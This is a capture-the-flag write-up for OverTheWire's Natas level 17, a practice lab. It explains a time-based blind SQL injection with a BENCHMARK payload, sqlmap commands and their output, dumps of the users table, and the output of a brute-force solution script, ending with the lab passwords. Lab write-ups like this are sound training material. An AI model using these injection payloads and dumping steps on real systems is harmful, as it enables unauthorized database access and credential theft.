# Write up

To login in the domain `http://natas17.natas.labs.overthewire.org` use credentials:

Username: `natas17`<br/>
Password: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

In this level we are presented with a username search form. Viewing the source code, we see that the server response is the same for both existing usernames and non-existing usernames. More particularly, it is just an empty response regardless of the query! This leads us to suspect usage of time-based SQLi. In order to check if the system is vulnerable to SQLi (without viewing the source code), we can measure the response for the following username search:<br/>
`" OR BENCHMARK(100000000, ENCODE('MSG','s0m3k3y')) #`<br/> which results in the following query to be executed

```sql
SELECT * from users where username="" OR BENCHMARK(100000000, ENCODE('MSG','s0m3k3y')) #"
```

The response for the above query takes a long time, thus we can infer that the server is vulnerable to a time-based blind SQLi. This can also be confirmed by running `sqlmap`

```bash
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 -v 3 --proxy "http://127.0.0.1:8080"
```

```log
sqlmap identified the following injection point(s) with a total of 4201 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=" AND (SELECT 1770 FROM (SELECT(SLEEP(5)))HKoh)-- yxuU
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[11:40:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
```

Now, we need to find the database schema (for this level we are using the `natas17` database)

```bash
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 --tables
```

```log
Database: natas17
[1 table]
+-------+
| users |
+-------+
```

And now we can dump the users. More particularly we are interested only in user `natas18`, but lets dump the whole table out of curiosity

```bash
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 -T users --dump
```

```log
Database: natas17
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd | user1    |
| MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 | user2    |
| VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD | user3    |
| xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP | natas18  |
+----------------------------------+----------+
```

If we wanted only the user `natas18`, then we would execute

```bash
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 -T users --where 'username="natas18"' --dump
```

```log
Database: natas17
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP | natas18  |
+----------------------------------+----------+
```

The password for natas18 can also be dumped using a python script (solut<span>ion.p</span>y) that does the same job as `sqlmap`: Brute-forced the password for username `natas18` using a time-based blind SQLi.

```bash
python solution.py 
```

```log
Brute-forcing password for username natas18
________________________________
x_______________________________
xv______________________________
xvK_____________________________
xvKI____________________________
xvKIq___________________________
xvKIqD__________________________
xvKIqDj_________________________
xvKIqDjy________________________
xvKIqDjy4_______________________
xvKIqDjy4O______________________
xvKIqDjy4OP_____________________
xvKIqDjy4OPv____________________
xvKIqDjy4OPv7___________________
xvKIqDjy4OPv7w__________________
xvKIqDjy4OPv7wC_________________
xvKIqDjy4OPv7wCR________________
xvKIqDjy4OPv7wCRg_______________
xvKIqDjy4OPv7wCRgD______________
xvKIqDjy4OPv7wCRgDl_____________
xvKIqDjy4OPv7wCRgDlm____________
xvKIqDjy4OPv7wCRgDlmj___________
xvKIqDjy4OPv7wCRgDlmj0__________
xvKIqDjy4OPv7wCRgDlmj0p_________
xvKIqDjy4OPv7wCRgDlmj0pF________
xvKIqDjy4OPv7wCRgDlmj0pFs_______
xvKIqDjy4OPv7wCRgDlmj0pFsC______
xvKIqDjy4OPv7wCRgDlmj0pFsCs_____
xvKIqDjy4OPv7wCRgDlmj0pFsCsD____
xvKIqDjy4OPv7wCRgDlmj0pFsCsDj___
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh__
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd_
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

~~~ Credentials for level18 ~~~
UN: natas18
PW: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
~~~ ~~~~~~~~~~~ ~~~ ~~~~~~~ ~~~
```

Thus we are presented wit the password for level18, which is `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

So to login in the level18 use the credentials:

Username: `natas18`<br/>
Password: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
